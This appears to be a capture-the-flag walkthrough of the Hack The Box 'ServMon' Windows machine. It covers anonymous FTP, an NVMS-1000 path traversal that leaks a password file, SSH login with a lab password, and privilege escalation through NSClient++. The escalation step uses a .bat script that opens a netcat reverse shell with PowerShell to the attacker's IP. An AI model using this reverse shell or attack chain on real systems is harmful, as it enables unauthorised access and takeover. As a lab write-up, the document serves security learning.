Hello,

This time I am writing the solution for the ServMon box. A easy windows box. Let's dive into the solution.

ðŸ”¥ nmap to get the open ports.
```
nmap -sC -sV -oA initial -Pn 10.10.10.184
```
The resutls...

```

First of all the one port I will look is ftp because I have anonymous access allowed. 
There is a directory named Users and inside that there are two directories `Nadine` and `Nathan` containing two files named `Confidential.txt` and `Notes to do.txt` respectively. It is a good thing at this time to keep notes about these two usernames. 

The content of `Confidential.txt`:
```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```
I keep in back of my mind that there is file named Passwords.txt in Nathan Desktop folder.

And `Notes to do.txt`:
```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

There are some incompleted todo's such as remove public access to NVMS. Remember port 80? Let's take a look into that.

![port80vms](https://user-images.githubusercontent.com/16364370/79076621-8d5a5680-7cc9-11ea-9e9e-bfe92a2143e5.png)

So this validates the 4th todo. I try to login by using `admin` as username and password but nothing. At this point because I don't have a password, I try to search about vulnerabilites.

![directory_traversalt_nvms1000](https://user-images.githubusercontent.com/16364370/79076663-fb9f1900-7cc9-11ea-97c4-0d60d87643ce.png)

![dir_traversal](https://user-images.githubusercontent.com/16364370/79076787-ce069f80-7cca-11ea-8ad2-59de22089166.png)

I open burp, navigate to 10.10.10.184 intercept the request and then send it to repeater(ctrl+r).

![verify_path_traversa](https://user-images.githubusercontent.com/16364370/79077401-69017880-7ccf-11ea-8627-919d5193e196.png)

And indeed this works. Now If you remember from `Confidential.txt` there is a file with passwords. I get that file.

![get_password_file](https://user-images.githubusercontent.com/16364370/79077424-b1209b00-7ccf-11ea-93c6-0fe63986809e.png)

After trying each of this password with ssh password `L1k3B1gBut7s@W0rk` worked.

```
Microsoft Windows [Version 10.0.18363.752]          
(c) 2019 Microsoft Corporation. All rights reserved.
                                                    
nadine@SERVMON C:\Users\Nadine>         
```
We can get user flag now. 

After searching the box for hints about root, I find nothing. Going back to nmap we can see a port open `84433` wiht ssl cert. Visiting the site brings up a `NSClient++`.

Searching with searchsploit turns out there is a privilege escalation.

First we need to get the password of the client from file `c:\program files\nsclient++\nsclient.ini`

```
; Undocumented key                                        
password = ew2x6SsGTxjRwXOT  
```

But the password does not work. Giving us a 403.

![notallowed](https://user-images.githubusercontent.com/16364370/79077749-a2d37e80-7cd1-11ea-9494-497260d5952a.png)
Going back to the `nsclient.ini` file I see there is present a configuration which does not allow connections from 
```
; Undocumented key
allowed hosts = 127.0.0.1
````
Because I am using ssh I can create a local tunnel from my host to nsclient locally and then access it. By doing this I use a [trick](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/) to access something like a hidden menu on ssh, and then execute
`-L 8443:127.0.0.1:8443`. And then go to my browser and access the website with `https://localhost:8443`

I now create a .bat script
```
@echo off
C:\Temp\nc.exe 10.10.14.52 9854 -e powershell
```
and upload it alongside nc.exe inside `C:\Temp\` and setup listener on our local box

Next step is to enable two modules:
 - CheckExternalScripts
 - Scheduler

After I create a externalscript, with these key and value.(replace fuxsocy.bat with your .bat filename)

![extscript](https://user-images.githubusercontent.com/16364370/79078083-ed55fa80-7cd3-11ea-9ba3-7a07fd66b31d.png)

Next I setup to run it every minute.

![timer](https://user-images.githubusercontent.com/16364370/79078482-af0e0a80-7cd6-11ea-8c8c-878907d3f63f.png)

and specify the command, which in our case is rce, which is the name of the external script which will execute the command.

![rce](https://user-images.githubusercontent.com/16364370/79078149-5473af00-7cd4-11ea-8c9a-7633d5dd813c.png)

Then I save the Changes under the `Changes` button and Under `Control` button I reset the service. I wait for 1-2 minutes and get a shell as administrator.

![shell_as_admistrator](https://user-images.githubusercontent.com/16364370/79078514-e1b80300-7cd6-11ea-901b-ad1dfffc54c7.png)
